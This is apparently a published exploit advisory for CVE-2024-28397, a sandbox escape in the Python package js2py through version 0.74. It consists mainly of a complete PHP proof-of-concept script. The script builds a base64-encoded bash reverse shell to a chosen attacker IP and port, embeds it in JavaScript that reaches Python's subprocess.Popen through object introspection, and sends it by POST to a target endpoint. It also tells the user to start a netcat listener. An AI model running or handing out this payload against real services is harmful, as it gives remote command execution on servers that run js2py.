@@ -1,0 +1,253 @@
+=============================================================================================================================================
+| # Title     : js2py v0.74 Automated Sandbox Escape & Reverse Shell                                                                        |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://pypi.org/project/Js2Py/                                                                                             |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212543/ & CVE-2024-28397
+
+[+] Summary    : js2py — a Python package that interprets and executes JavaScript code inside Python.
+
+[+] Nature of the Vulnerability
+
+The flaw exists in the sandboxing mechanism.
+
+The function disable_pyimport() fails to block access to Python internals.
+
+An attacker can escape the JavaScript sandbox and obtain Python object references.
+
+This leads to arbitrary Python code execution (RCE).
+
+[+] Impact
+
+Sandbox Escape
+
+Remote Code Execution (RCE)
+
+Threat level depends on context; potentially critical for web services using js2py to execute untrusted JS.
+
+[+] Affected Versions
+
+All versions up to and including v0.74
+
+There is no stable upstream patch on PyPI as of the time of vulnerability reporting.
+
+Some Linux distributions patched the package themselves.
+
+POC : php poc.php
+
+<?php
+// Configuration for Terminal Colors
+class Colors {
+    const HEADER = "\033[95m";
+    const BLUE = "\033[94m";
+    const GREEN = "\033[92m";
+    const WARNING = "\033[93m";
+    const FAIL = "\033[91m";
+    const ENDC = "\033[0m";
+    const BOLD = "\033[1m";
+}
+
+function banner() {
+    echo Colors::BLUE . Colors::BOLD . "
+
+ ██╗███╗   ██╗██████╗  ██████╗ ██╗   ██╗███████╗██╗  ██╗██╗  ██╗ █████╗ 
+ ██║████╗  ██║██╔══██╗██╔═══██╗██║   ██║██╔════╝██║  ██║██║ ██╔╝██╔══██╗
+ ██║██╔██╗ ██║██   █╔╝██║   ██║██║   ██║███████╗███████║█████╔╝ ███████║
+ ██║██║╚██╗██║██╔══██╗██║   ██║██║   ██║╚════██║██╔══██║██╔═██╗ ██╔══██║
+ ██║██║ ╚████║██████╔╝╚██████╔╝╚██████╔╝███████║██║  ██║██║  ██╗██║  ██║
+ ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
+                                                    
+    " . Colors::ENDC . "\n";
+    
+    echo Colors::HEADER . "[*] Automated Sandbox Escape & Reverse Shell Generator" . Colors::ENDC . "\n";
+    echo Colors::HEADER . "[*] Target: js2py Library" . Colors::ENDC . "\n";
+    echo Colors::HEADER . "[*] Author: indoushka" . Colors::ENDC . "\n";
+    echo "---------------------------------------------------------------\n";
+}
+
+function generate_payload($attacker_ip, $attacker_port) {
+    /**
+     * Generates the Malicious JavaScript payload to bypass js2py sandbox.
+     * 
+     * @param string $attacker_ip The IP address of the listener (LHOST).
+     * @param int $attacker_port The port of the listener (LPORT).
+     * 
+     * @return string The raw JavaScript payload.
+     */
+    echo Colors::BLUE . "[INFO]" . Colors::ENDC . " Generating Base64 encoded payload for {$attacker_ip}:{$attacker_port}...\n";
+    
+    // 1. Construct the Bash Reverse Shell
+    $raw_command = "bash -i >& /dev/tcp/{$attacker_ip}/{$attacker_port} 0>&1";
+    
+    // 2. Base64 Encode to avoid syntax errors in JS
+    $b64_command = base64_encode($raw_command);
+    
+    // 3. Create the Execution Wrapper
+    $exec_command = "echo {$b64_command} | base64 -d | bash";
+
+    // 4. The JavaScript Sandbox Escape Logic (Credit: Marven11)
+    $js_payload = <<<JS
+    let cmd = "{$exec_command}";
+    let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__;
+    let obj = a(a(a,"__class__"), "__base__");
+
+    function findpopen(o) {
+        let result;
+        for(let i in o.__subclasses__()) {
+            let item = o.__subclasses__()[i];
+            if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
+                return item;
+            }
+            if(item.__name__ != "type" && (result = findpopen(item))) {
+                return result;
+            }
+        }
+    }
+
+    let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
+    console.log(result);
+    result;
+JS;
+    
+    return $js_payload;
+}
+
+function send_exploit($url, $js_payload) {
+    /**
+     * Sends the crafted payload to the vulnerable endpoint.
+     */
+    $headers = [
+        "Content-Type: application/json",
+        "User-Agent: Mozilla/5.0 (Security-Research-PoC)"
+    ];
+    
+    $data = json_encode(["code" => $js_payload]);
+
+    echo Colors::BLUE . "[INFO]" . Colors::ENDC . " Targeting URL: " . Colors::BOLD . $url . Colors::ENDC . "\n";
+    echo Colors::WARNING . "[WARN]" . Colors::ENDC . " Sending malicious payload. Check your listener! (nc -lvnp <port>)\n";
+    
+    try {
+        $ch = curl_init();
+        
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5); // Timeout 5 seconds
+        
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $error = curl_error($ch);
+        
+        curl_close($ch);
+        
+        if ($error && strpos($error, 'timeout') !== false) {
+            echo "\n" . Colors::GREEN . "[SUCCESS]" . Colors::ENDC . " Request timed out.\n";
+            echo Colors::GREEN . "[+]" . Colors::ENDC . " This usually indicates the shell has executed and is holding the connection.\n";
+        } else {
+            echo Colors::GREEN . "[+]" . Colors::ENDC . " Response Code: {$http_code}\n";
+            if (!empty($response)) {
+                echo Colors::GREEN . "[+]" . Colors::ENDC . " Response Body: {$response}\n";
+            }
+        }
+        
+    } catch (Exception $e) {
+        echo Colors::FAIL . "[ERROR]" . Colors::ENDC . " An error occurred: " . $e->getMessage() . "\n";
+    }
+}
+
+function check_dependencies() {
+    /**
+     * Check if required extensions are loaded
+     */
+    if (!function_exists('curl_init')) {
+        echo Colors::FAIL . "[ERROR]" . Colors::ENDC . " cURL extension is not enabled. Please enable it in php.ini\n";
+        exit(1);
+    }
+    
+    if (!function_exists('json_encode')) {
+        echo Colors::FAIL . "[ERROR]" . Colors::ENDC . " JSON extension is not enabled. Please enable it in php.ini\n";
+        exit(1);
+    }
+}
+
+function main($argv) {
+    banner();
+    check_dependencies();
+    
+    // Parse command line arguments
+    $options = [];
+    
+    // Simple argument parsing for Windows
+    for ($i = 1; $i < count($argv); $i++) {
+        if ($argv[$i] == '-u' || $argv[$i] == '--url') {
+            $options['url'] = $argv[++$i] ?? '';
+        } elseif ($argv[$i] == '-i' || $argv[$i] == '--ip') {
+            $options['ip'] = $argv[++$i] ?? '';
+        } elseif ($argv[$i] == '-p' || $argv[$i] == '--port') {
+            $options['port'] = $argv[++$i] ?? '';
+        } elseif ($argv[$i] == '-h' || $argv[$i] == '--help') {
+            echo "Usage: php " . basename(__FILE__) . " -u <url> -i <ip> -p <port>\n";
+            echo "Example: php " . basename(__FILE__) . " -u http://target.com/run_code -i 192.168.1.100 -p 4444\n";
+            exit(0);
+        }
+    }
+    
+    // Validate required arguments
+    if (empty($options) || !isset($options['url']) || !isset($options['ip']) || !isset($options['port'])) {
+        echo Colors::FAIL . "[ERROR]" . Colors::ENDC . " Missing required arguments!\n";
+        echo "Usage: php " . basename(__FILE__) . " -u <url> -i <ip> -p <port>\n";
+        echo "Example: php " . basename(__FILE__) . " -u http://target.com/run_code -i 192.168.1.100 -p 4444\n";
+        exit(1);
+    }
+    
+    $url = $options['url'];
+    $ip = $options['ip'];
+    $port = intval($options['port']);
+    
+    // Validate port number
+    if ($port < 1 || $port > 65535) {
+        echo Colors::FAIL . "[ERROR]" . Colors::ENDC . " Invalid port number: {$port}\n";
+        exit(1);
+    }
+    
+    // Validate URL format
+    if (!filter_var($url, FILTER_VALIDATE_URL)) {
+        echo Colors::FAIL . "[ERROR]" . Colors::ENDC . " Invalid URL format: {$url}\n";
+        exit(1);
+    }
+    
+    try {
+        $payload = generate_payload($ip, $port);
+        
+        // Show a preview of the payload
+        echo Colors::BLUE . "[INFO]" . Colors::ENDC . " Payload preview (first 200 chars):\n";
+        echo substr($payload, 0, 200) . "...\n\n";
+        
+        // Ask for confirmation
+        echo Colors::WARNING . "[WARNING]" . Colors::ENDC . " This will send an exploit payload. Are you sure? (y/n): ";
+        $handle = fopen("php://stdin", "r");
+        $line = fgets($handle);
+        fclose($handle);
+        
+        if (trim(strtolower($line)) != 'y') {
+            echo Colors::FAIL . "[!]" . Colors::ENDC . " Operation cancelled by user.\n";
+            exit(0);
+        }
+        
+        send_exploit($url, $payload);
+        
+    } catch (Exception $e) {
+        echo Colors::FAIL . "[!]" . Colors::ENDC . " Error: " . $e->getMessage() . "\n";
+        exit(1);
+    }
+}
+
+// Run the main function with command line arguments
+main($argv);
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
